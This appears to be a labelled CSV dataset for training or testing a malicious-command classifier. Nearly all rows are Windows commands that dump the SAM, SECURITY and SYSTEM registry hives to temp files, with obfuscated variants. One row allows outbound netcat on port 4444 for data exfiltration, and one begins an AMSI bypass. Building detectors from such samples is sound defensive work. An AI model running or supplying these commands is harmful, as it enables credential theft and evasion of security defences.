text,label
reg export hklm\security c:\windows\temp\vux7og8v.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\53hozao8.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\q5km8un6.dat""",1
"cmd.exe  /c  ""reg  export  hklm\security  c:\temp\gqotmcjj.dat""",1
"cmd.exe /c ""cmd.exe   /c   ""reg   export   hklm\security   c:\temp\zxm1us21.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\aj17i5dt.dat""",1
reg export hklm\sam c:\windows\temp\rjgnjmtc.save,1
reg export hklm\system c:\windows\temp\nasumx4y.save,1
reg save hklm\security c:\windows\temp\4y8yqm6l.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\tea2x6fn.dat""",1
reg save hklm\sam c:\windows\temp\157ygm33.save,1
reg save hklm\sam c:\windows\temp\1zkt5udo.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\3j47y6l4.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\g14siker.dat""",1
reg export hklm\security c:\windows\temp\3nnfxxkp.save,1
reg   export   hklm\sam   c:\windows\temp\nhx02xn0.save,1
reg export hklm\security c:\windows\temp\kj8xcab4.save,1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\sam c:\temp\1n3xjl57.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\uz7333mf.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\omjhv7hq.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\217zxg12.dat""",1
"powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\4ed2m660.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\x2vbaj2j.dat""",1
reg  save  hklm\sam  c:\windows\temp\h3ficxak.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\6g1acq5e.dat""",1
reg export hklm\security c:\windows\temp\3253yib0.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\06yrzfoo.dat""",1
reg export hklm\security c:\windows\temp\yip1rx2l.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\3zbqul7c.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\nht8bah8.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\2752vpaj.dat""",1
"powershell -nop -c ""powershell -nop -c ""reg save hklm\sam c:\temp\a4nxjg6w.dat""""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\71mbr1qp.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\muwmpqvc.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\6uyasj8v.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\xwm6o32c.dat""",1
reg export hklm\system c:\windows\temp\443yz5dn.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\sh87opb8.dat""",1
reg export hklm\sam c:\windows\temp\f6jv03ck.save,1
reg export hklm\sam c:\windows\temp\ly7pvcdn.save,1
reg export hklm\security c:\windows\temp\ujng979h.save,1
reg export hklm\sam c:\windows\temp\eurie1or.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\vchidppi.dat""",1
reg save hklm\sam c:\windows\temp\ta2p8uf6.save,1
reg export hklm\security c:\windows\temp\isnvyqxm.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\uyr8ik7z.dat""",1
reg export hklm\security c:\windows\temp\vmer8ggi.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\czv2bksu.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\mfgi1xbg.dat""",1
reg export hklm\sam c:\windows\temp\dant4ljq.save,1
reg save hklm\sam c:\windows\temp\t8tbk09m.save,1
reg export hklm\security c:\windows\temp\illwklv5.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\bgtckjwv.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\kusc003h.dat""",1
reg save hklm\system c:\windows\temp\pdq3ugg2.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\5l9j3vgt.dat""",1
reg save hklm\security c:\windows\temp\ubgll1re.save,1
reg export hklm\sam c:\windows\temp\twt6u5eo.save,1
reg save hklm\system c:\windows\temp\j0waesz1.save,1
reg export hklm\security c:\windows\temp\1oi34fw7.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\5nim0thb.dat""",1
reg save hklm\sam c:\windows\temp\x1xyydlc.save,1
reg save hklm\system c:\windows\temp\h2x9pm9w.save,1
"powershell -nop -c ""reg   save   hklm\sam   c:\windows\temp\0of9qzka.save""",1
reg save hklm\sam c:\windows\temp\ua6790ck.save,1
reg save hklm\sam c:\windows\temp\q1lj27l1.save,1
"cmd.exe /c ""reg  export  hklm\sam  c:\windows\temp\l8qyeazs.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\1603w1ml.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\yto9amg2.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\nn1p5xoh.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\04d550yr.dat""",1
reg save hklm\system c:\windows\temp\uf7j2j60.save,1
reg save hklm\sam c:\windows\temp\rbf174x4.save,1
reg export hklm\sam c:\windows\temp\j4p7jjo7.save,1
reg save hklm\system c:\windows\temp\ulrn3gh5.save,1
reg save hklm\security c:\windows\temp\aijbln2i.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\u3ph4ahc.dat""",1
"cmd.exe /c ""reg  save  hklm\security  c:\windows\temp\278u84pi.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\azw667kn.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\zjq92g39.dat""",1
reg export hklm\sam c:\windows\temp\8nmkcmbf.save,1
"powershell -nop -c ""rule:  exfil  data  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
"powershell -nop -c ""reg save hklm\sam c:\temp\qgcup8ss.dat""",1
reg save hklm\sam c:\windows\temp\86s5akjh.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\8hsjas6h.dat""",1
reg export hklm\sam c:\windows\temp\krzqxf6k.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\i8w87tub.dat""",1
"cmd.exe /c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\womkoilz.dat""""",1
reg export hklm\system c:\windows\temp\bvdhm74k.save,1
"powershell -nop -c ""powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\e6bbh362.dat""""",1
reg export hklm\system c:\windows\temp\mwxu929g.save,1
reg export hklm\system c:\windows\temp\u363tczk.save,1
reg save hklm\sam c:\windows\temp\qm4255iq.save,1
reg export hklm\sam c:\windows\temp\1tcddpyx.save,1
reg export hklm\security c:\windows\temp\00rdbkqt.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\kpadc6h1.dat""",1
reg save hklm\system c:\windows\temp\3msbj4ov.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\76zk0s1w.dat""",1
reg save hklm\security c:\windows\temp\o3ivg5aa.save,1
reg save hklm\security c:\windows\temp\uidprcd7.save,1
reg save hklm\sam c:\windows\temp\26wzq1dt.save,1
reg save hklm\security c:\windows\temp\m079pi4d.save,1
"cmd.exe /c ""$a  =  [ref].assembly.gettype('system.management.automation.amsiutils')""",3
reg export hklm\system c:\windows\temp\ib7tgm7d.save,1
reg save hklm\security c:\windows\temp\a7opyild.save,1
reg export hklm\sam c:\windows\temp\bn49dto5.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\rh2bgwi0.dat""",1
reg export hklm\system c:\windows\temp\zle0kv5v.save,1
reg export hklm\sam c:\windows\temp\oimtyfmd.save,1
"powershell -nop -c ""reg  export  hklm\security  c:\windows\temp\y0vk5tks.save""",1
reg export hklm\security c:\windows\temp\ps9t6t8g.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\bm46tol6.dat""",1
reg export hklm\sam c:\windows\temp\ovn1vcq5.save,1
reg export hklm\system c:\windows\temp\4wihr5b0.save,1
reg save hklm\sam c:\windows\temp\dncr1kv3.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\2h2soyqe.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\777cb3k5.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\307y6uxl.dat""",1
"cmd.exe  /c  ""reg  export  hklm\security  c:\temp\kh77l3m9.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\444x9c5s.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\jdaaxl3t.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\kxiewd3v.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\guy8m0m1.dat""",1
"powershell -nop -c ""reg  save  hklm\system  c:\windows\temp\anaxgahp.save""",1
reg export hklm\system c:\windows\temp\dw7qz9zf.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\rbsy5byp.dat""",1
reg   save   hklm\security   c:\windows\temp\x0lw401m.save,1
reg export hklm\sam c:\windows\temp\qt7xuul3.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\g3kejwxb.dat""",1
"cmd.exe /c ""cmd.exe  /c  ""reg  export  hklm\security  c:\temp\olfxoe2l.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\0kg8997j.dat""",1
reg save hklm\security c:\windows\temp\ukocb6ha.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\2nlugixb.dat""",1
"powershell -nop -c ""reg   save   hklm\system   c:\windows\temp\adfgzso7.save""",1
reg  export  hklm\system  c:\windows\temp\3muqtswp.save,1
reg save hklm\sam c:\windows\temp\5q9nvdqc.save,1
reg export hklm\system c:\windows\temp\1gcn5jq7.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\aqvn5a5q.dat""",1
reg export hklm\security c:\windows\temp\v5dgcipy.save,1
reg save hklm\sam c:\windows\temp\vrvqsmia.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\kbdlrdcj.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\sd6kuzom.dat""",1
"cmd.exe   /c   ""reg   export   hklm\security   c:\temp\pia6skv2.dat""",1
reg export hklm\sam c:\windows\temp\lqk9tfhp.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\2zcu15er.dat""",1
reg save hklm\security c:\windows\temp\ebw9qxms.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\clt1w95v.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\sfr1exi0.dat""",1
"powershell -nop -c ""reg export hklm\security c:\windows\temp\gkfhvh1p.save""",1
reg  save  hklm\system  c:\windows\temp\2pmisfda.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\9fppyjii.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\g12ja3sf.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\0l4q9l9s.dat""",1
"cmd.exe /c ""reg save hklm\security c:\windows\temp\jhd3irow.save""",1
reg save hklm\sam c:\windows\temp\lvv58r5f.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\w2n4ngqx.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\eio9r89k.dat""",1
reg save hklm\sam c:\windows\temp\f9zfpf5a.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\vsvkwm3q.dat""",1
reg export hklm\security c:\windows\temp\k29jtym1.save,1
reg save hklm\sam c:\windows\temp\2hjav09p.save,1
reg export hklm\security c:\windows\temp\pjwkg8gm.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\eq5pwg88.dat""",1
reg save hklm\sam c:\windows\temp\5lvmypo0.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\1vuv3rhx.dat""",1
reg save hklm\security c:\windows\temp\qdmae5qa.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\bnbasxyh.dat""",1
reg export hklm\system c:\windows\temp\yp4rff2i.save,1
reg save hklm\security c:\windows\temp\zkf277gk.save,1
"powershell -nop -c ""reg  save  hklm\sam  c:\windows\temp\krbgb847.save""",1
"powershell -nop -c ""reg save hklm\security c:\temp\vemlvu55.dat""",1
reg save hklm\security c:\windows\temp\9sc2nru2.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\bp45420i.dat""",1
